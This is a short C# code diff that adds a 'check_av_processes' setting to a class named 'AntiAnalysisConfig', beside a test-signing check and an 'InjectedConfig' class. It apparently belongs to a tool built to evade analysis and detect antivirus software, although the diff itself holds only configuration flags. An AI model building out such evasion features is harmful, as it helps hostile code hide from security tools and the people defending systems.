@@ -29,6 +29,9 @@ public class AntiAnalysisConfig
 
     [System.Text.Json.Serialization.JsonPropertyName("check_test_signing")]
     public bool check_test_signing { get; set; } = true;
+
+    [System.Text.Json.Serialization.JsonPropertyName("check_av_processes")]
+    public bool check_av_processes { get; set; } = true;
 }
 
 public class InjectedConfig
